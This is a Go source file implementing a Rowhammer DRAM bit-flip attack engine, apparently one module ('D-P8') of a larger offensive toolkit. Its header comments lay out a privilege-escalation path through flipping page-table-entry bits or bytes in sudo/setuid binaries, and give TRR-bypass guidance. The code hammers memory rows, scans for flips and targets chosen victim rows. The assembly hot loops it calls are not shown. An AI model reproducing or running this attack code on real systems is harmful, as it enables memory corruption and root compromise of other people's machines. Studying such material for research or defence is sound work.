// Package rowhammer implements D-P8: Rowhammer DRAM Bit-Flip Attack.
//
// ───────────────────────────────────────────────────────────────────────────
// ATTACK MODEL
// ───────────────────────────────────────────────────────────────────────────
//
// DRAM cells are capacitors that hold charge. Repeatedly reading (hammering)
// adjacent memory rows causes capacitive coupling that flips bits in the
// target row — WITHOUT any software vulnerability.
//
// Physical layout:
//
//   DRAM:   Row N-1  ← aggressor row (we read this rapidly)
//           Row N    ← victim row   (bit flips here)
//           Row N+1  ← aggressor row (we read this rapidly)
//
// The attack:
//   1. Map two physical rows adjacent to target row.
//   2. Flush both rows from CPU cache (CLFLUSH instruction).
//   3. Read both rows (forces DRAM access, not cache hit).
//   4. Repeat 100k+ times per 64ms refresh interval.
//   5. Check victim row for bit flips.
//   6. If flip found at a useful location → exploit.
//
// ───────────────────────────────────────────────────────────────────────────
// EXPLOITATION PATH
// ───────────────────────────────────────────────────────────────────────────
//
//   Target: Page Table Entry (PTE)
//   Goal:   Flip bit 63 (NX) → 0  OR  flip bits 1-2 (R/W, Supervisor) → allow user write
//   Result: User-space process can write to kernel pages → privilege escalation
//
//   Alternative target: sudo/setuid binary's text page
//   Goal:   Flip a byte in the binary's code → bypass auth check
//   Result: Execute as root without password
//
// ───────────────────────────────────────────────────────────────────────────
// HARDWARE REQUIREMENTS
// ───────────────────────────────────────────────────────────────────────────
//
//   - DDR3/DDR4 DRAM without ECC (most consumer hardware)
//   - Intel: CLFLUSH available (all x86-64)
//   - ARM: DC CIVAC / DC CVAC cache line flush (ARM64)
//   - Vulnerable DRAM: ~85% of DDR3, ~60% of DDR4 (pre-TRR)
//   - DDR4 with TRR (Target Row Refresh): use multi-sided hammering
//     (hammer 3+ rows simultaneously to bypass TRR counters)
//
// ───────────────────────────────────────────────────────────────────────────
// REFERENCES
// ───────────────────────────────────────────────────────────────────────────
//
//   Original paper: "Flipping Bits in Memory Without Accessing Them"
//     Kim et al., IEEE S&P 2014
//   rowhammer.js: JavaScript rowhammer via eviction sets (no CLFLUSH)
//   Flip Feng Shui: Exploit rowhammer via memory deduplication (KSM)
//   RAMpage: CVE-2018-9442 — Android DMA + rowhammer
//   TRRespass: bypassing DDR4 TRR with many-sided hammering
//   BlackSmith: Non-uniform hammer patterns for TRR bypass
//
package rowhammer

import (
	"fmt"
	"runtime"
	"time"
	"unsafe"
)

const (
	// HammerIterations is how many read pairs to perform in one round.
	// At ~50ns/access, 100k iterations ≈ 10ms (well under 64ms refresh window).
	HammerIterations = 100_000

	// HammerRounds is how many refresh windows to hammer before checking.
	HammerRounds = 10

	// RowSize is the DRAM row size in bytes (typically 8KB for modern DRAM).
	RowSize = 8 * 1024

	// CacheLineSize is the cache line granularity for CLFLUSH.
	CacheLineSize = 64

	// ManyHammerSides is the number of aggressor rows for TRR bypass.
	// 2-sided: classic, works on DDR3.
	// 8-sided: TRRespass pattern for DDR4 with TRR.
	ManyHammerSides = 8

	// AllocSize is the size of our mmap'd test arena.
	AllocSize = 256 * 1024 * 1024 // 256 MB
)

// HammerResult records a confirmed bit flip.
type HammerResult struct {
	// VirtualAddr is the address of the flipped bit (victim row).
	VirtualAddr uintptr
	// ByteOffset is the offset within the victim row.
	ByteOffset int
	// BitPosition is the bit number (0-63) that flipped.
	BitPosition int
	// Original byte value before flip.
	Original byte
	// Flipped byte value after flip.
	Flipped byte
	// IsZeroToOne indicates the flip direction.
	IsZeroToOne bool
	// HammerTime is how long the hammer took.
	HammerTime time.Duration
}

// HammerConfig controls the hammer engine.
type HammerConfig struct {
	// Pattern is the fill pattern for aggressor rows.
	// 0xFF (all ones) causes more zero-to-one flips.
	// 0x00 (all zeros) causes more one-to-zero flips.
	Pattern byte
	// Iterations per round (default: HammerIterations).
	Iterations int
	// Rounds before checking for flips (default: HammerRounds).
	Rounds int
	// UseManyHammer enables multi-sided (TRR bypass) hammering.
	UseManyHammer bool
	// MaxFlipsWanted stops after finding this many flips (0 = find all).
	MaxFlipsWanted int
	// Timeout stops searching after this duration (0 = no limit).
	Timeout time.Duration
	// OnFlip is called when a bit flip is found (optional).
	OnFlip func(*HammerResult)
}

// HammerEngine performs the core row hammering.
type HammerEngine struct {
	cfg  *HammerConfig
	buf  []byte
	base uintptr
}

// NewHammerEngine allocates a large memory arena and prepares the engine.
func NewHammerEngine(cfg *HammerConfig) (*HammerEngine, error) {
	if cfg.Iterations == 0 {
		cfg.Iterations = HammerIterations
	}
	if cfg.Rounds == 0 {
		cfg.Rounds = HammerRounds
	}

	buf, err := allocLargeBuffer(AllocSize)
	if err != nil {
		return nil, fmt.Errorf("alloc hammer buffer: %w", err)
	}

	return &HammerEngine{
		cfg:  cfg,
		buf:  buf,
		base: uintptr(unsafe.Pointer(&buf[0])),
	}, nil
}

// Close frees the hammer buffer.
func (e *HammerEngine) Close() {
	freeLargeBuffer(e.buf)
	e.buf = nil
}

// FindFlips fills the buffer and hammers all row pairs, returning any flips.
func (e *HammerEngine) FindFlips() ([]*HammerResult, error) {
	var results []*HammerResult
	start := time.Now()

	// Fill buffer with pattern.
	fillPattern(e.buf, e.cfg.Pattern)
	runtime.GC() // Force GC so we have clean page state.

	numRows := len(e.buf) / RowSize
	if numRows < 3 {
		return nil, fmt.Errorf("buffer too small for hammering")
	}

	flipCount := 0
	for aggRow := 1; aggRow < numRows-1; aggRow++ {
		if e.cfg.Timeout > 0 && time.Since(start) > e.cfg.Timeout {
			break
		}
		if e.cfg.MaxFlipsWanted > 0 && flipCount >= e.cfg.MaxFlipsWanted {
			break
		}

		aggAddr1 := e.rowAddr(aggRow - 1)
		aggAddr2 := e.rowAddr(aggRow + 1)

		tStart := time.Now()
		if e.cfg.UseManyHammer {
			e.hammermany(aggRow)
		} else {
			e.hammer2sided(aggAddr1, aggAddr2)
		}
		elapsed := time.Since(tStart)

		// Check victim row for bit flips.
		victimBase := e.rowAddr(aggRow)
		for byteIdx := 0; byteIdx < RowSize; byteIdx++ {
			victimByte := *(*byte)(unsafe.Pointer(victimBase + uintptr(byteIdx)))
			if victimByte == e.cfg.Pattern {
				continue
			}
			// Byte differs from pattern — find exact flipped bit.
			diff := victimByte ^ e.cfg.Pattern
			for bit := 0; bit < 8; bit++ {
				if diff&(1<<bit) != 0 {
					res := &HammerResult{
						VirtualAddr: victimBase + uintptr(byteIdx),
						ByteOffset:  byteIdx,
						BitPosition: bit,
						Original:    e.cfg.Pattern,
						Flipped:     victimByte,
						IsZeroToOne: (e.cfg.Pattern>>bit)&1 == 0,
						HammerTime:  elapsed,
					}
					results = append(results, res)
					flipCount++
					if e.cfg.OnFlip != nil {
						e.cfg.OnFlip(res)
					}
				}
			}
		}

		// Refill hammered rows so next iteration starts clean.
		fillRowPattern(e.buf, aggRow-1, e.cfg.Pattern)
		fillRowPattern(e.buf, aggRow, e.cfg.Pattern)
		fillRowPattern(e.buf, aggRow+1, e.cfg.Pattern)
	}

	return results, nil
}

// TargetedHammer hammers a specific victim row address, checking for flips.
// victimVA must be the virtual address of the row to attack.
// Returns flips found in the victim row.
func (e *HammerEngine) TargetedHammer(victimVA uintptr) ([]*HammerResult, error) {
	var results []*HammerResult

	// Compute addresses of adjacent (aggressor) rows.
	// This assumes virtual-to-physical continuity within our arena.
	// In a real exploit, physical adjacency must be verified.
	if victimVA < e.base+RowSize || victimVA >= e.base+uintptr(len(e.buf))-RowSize {
		return nil, fmt.Errorf("victim address out of hammer arena")
	}

	aggAddr1 := victimVA - uintptr(RowSize)
	aggAddr2 := victimVA + uintptr(RowSize)

	// Fill victim row with pattern.
	fillAddrRange(victimVA, RowSize, e.cfg.Pattern)

	start := time.Now()
	e.hammer2sided(aggAddr1, aggAddr2)
	elapsed := time.Since(start)

	// Scan victim row.
	for byteIdx := 0; byteIdx < RowSize; byteIdx++ {
		b := *(*byte)(unsafe.Pointer(victimVA + uintptr(byteIdx)))
		if b == e.cfg.Pattern {
			continue
		}
		diff := b ^ e.cfg.Pattern
		for bit := 0; bit < 8; bit++ {
			if diff&(1<<bit) != 0 {
				results = append(results, &HammerResult{
					VirtualAddr: victimVA + uintptr(byteIdx),
					ByteOffset:  byteIdx,
					BitPosition: bit,
					Original:    e.cfg.Pattern,
					Flipped:     b,
					IsZeroToOne: (e.cfg.Pattern>>bit)&1 == 0,
					HammerTime:  elapsed,
				})
			}
		}
	}
	return results, nil
}

// ─── Internal helpers ─────────────────────────────────────────────────────

// rowAddr returns the virtual address of row i in the engine buffer.
func (e *HammerEngine) rowAddr(i int) uintptr {
	return e.base + uintptr(i*RowSize)
}

// hammer2sided performs classic 2-sided rowhammer on two aggressor rows.
// This is the platform-specific hot path; implemented in hammer_amd64.s.
func (e *HammerEngine) hammer2sided(addr1, addr2 uintptr) {
	hammer2sidedASM(addr1, addr2, e.cfg.Iterations, e.cfg.Rounds)
}

// hammermany performs multi-sided hammering for TRR bypass.
// Uses a rotating set of ManyHammerSides aggressor rows around victimRow.
func (e *HammerEngine) hammermany(victimRow int) {
	numRows := len(e.buf) / RowSize
	addrs := make([]uintptr, 0, ManyHammerSides)
	for side := 1; side <= ManyHammerSides/2; side++ {
		r1 := victimRow - side
		r2 := victimRow + side
		if r1 >= 0 && r1 < numRows {
			addrs = append(addrs, e.rowAddr(r1))
		}
		if r2 >= 0 && r2 < numRows {
			addrs = append(addrs, e.rowAddr(r2))
		}
	}
	hammerManyASM(addrs, e.cfg.Iterations, e.cfg.Rounds)
}

// fillPattern fills the entire buffer with the given byte pattern.
func fillPattern(buf []byte, pattern byte) {
	for i := range buf {
		buf[i] = pattern
	}
}

// fillRowPattern refills a specific row within the buffer.
func fillRowPattern(buf []byte, row int, pattern byte) {
	start := row * RowSize
	end := start + RowSize
	if end > len(buf) {
		end = len(buf)
	}
	for i := start; i < end; i++ {
		buf[i] = pattern
	}
}

// fillAddrRange fills memory at addr..addr+size with pattern.
func fillAddrRange(addr uintptr, size int, pattern byte) {
	for i := 0; i < size; i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = pattern
	}
}
